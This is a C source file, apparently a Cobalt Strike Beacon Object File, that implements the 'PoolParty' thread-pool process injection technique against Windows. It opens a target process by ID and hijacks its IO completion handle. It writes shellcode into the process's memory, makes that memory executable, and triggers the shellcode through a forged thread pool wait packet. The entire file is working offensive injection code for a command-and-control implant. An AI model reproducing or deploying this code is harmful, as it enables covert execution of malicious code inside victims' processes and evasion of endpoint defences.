#include "PoolParty.h"

//#define POOL_PARTY_EVENT_NAME "daje"

void RemoteTpWaitInsertion(HANDLE hTarget, LPVOID pShellcodeAddress) {
    _ZwAssociateWaitCompletionPacket ZwAssociateWaitCompletionPacket = (_ZwAssociateWaitCompletionPacket)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwAssociateWaitCompletionPacket"));
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));

    MSVCRT$srand((unsigned int)MSVCRT$time(NULL));
	wchar_t* POOL_PARTY_EVENT_NAME = generateRandomLettersW(7);

    PFULL_TP_WAIT pTpWait = KERNEL32$CreateThreadpoolWait((PTP_WAIT_CALLBACK)pShellcodeAddress, NULL, NULL);
    
    PFULL_TP_WAIT pRemoteTpWait = (PFULL_TP_WAIT)KERNEL32$VirtualAllocEx(hTarget, NULL, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    NtWriteVirtualMemory(hTarget, pRemoteTpWait, pTpWait, sizeof(FULL_TP_WAIT), NULL);

    PTP_DIRECT pRemoteTpDirect = (PTP_DIRECT)KERNEL32$VirtualAllocEx(hTarget, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    NtWriteVirtualMemory(hTarget, pRemoteTpDirect, &pTpWait->Direct, sizeof(TP_DIRECT), NULL);

    HANDLE hEvent = KERNEL32$CreateEventW(NULL, FALSE, FALSE, (LPCWSTR)POOL_PARTY_EVENT_NAME);
    BeaconPrintf(CALLBACK_OUTPUT, "Pool party event created with name: %s", POOL_PARTY_EVENT_NAME);
    ZwAssociateWaitCompletionPacket(pTpWait->WaitPkt, hIoCompletion, hEvent, pRemoteTpDirect, pRemoteTpWait, 0, 0, NULL);

    KERNEL32$SetEvent(hEvent);

}

void Inject3(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
    
    HANDLE hTarget = NULL;
    DWORD dwOldProtect = NULL;
    hTarget = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwTargetProcessId);
    
    if (hTarget != NULL) {
        HijackIoCompletionHandle(hTarget, IO_COMPLETION_ALL_ACCESS);
        
        PVOID pShellcodeAddress = KERNEL32$VirtualAllocEx(hTarget, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        NtWriteVirtualMemory(hTarget, pShellcodeAddress, shellcode, shellcodeSize, NULL);
        KERNEL32$VirtualProtectEx(hTarget, pShellcodeAddress, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect);
        
        RemoteTpWaitInsertion(hTarget, pShellcodeAddress);
    } else { 
          BeaconPrintf(CALLBACK_OUTPUT, "PID %d inaccessible", dwTargetProcessId);
      }
}
